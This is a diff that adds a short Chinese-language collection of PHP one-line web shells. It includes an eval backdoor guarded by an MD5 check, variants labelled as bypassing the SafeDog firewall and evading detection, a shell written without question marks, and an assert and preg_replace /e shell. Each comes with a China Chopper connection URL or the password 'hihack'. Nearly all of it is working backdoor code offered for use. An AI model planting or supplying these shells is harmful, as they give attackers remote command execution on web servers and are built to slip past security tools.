@@ -1,0 +1,21 @@
+
+
+防爆破一句话
+< ?php substr(md5($_REQUEST['x']),28)=='6862'&&eval($_REQUEST['hihack']);?>
+
+//菜刀地址http://192.168.64.137/x.php?x=myh0st 密码：hihack
+
+过狗一句话
+< ?php ($_=@$_GET[s]).@$_($_POST[hihack])?>
+//菜刀地址 http://localhost/1.php?s=assert 密码：hihack
+
+
+不用? 号的一句话
+<scriptlanguage="php">eval($_POST[hihack]);</script>
+
+躲避检测
+< ?php assert($_REQUEST["hihack"]);?>
+
+<?php 
+@preg_replace("/[email]/e",$_POST['h'],"error");  
+?> 
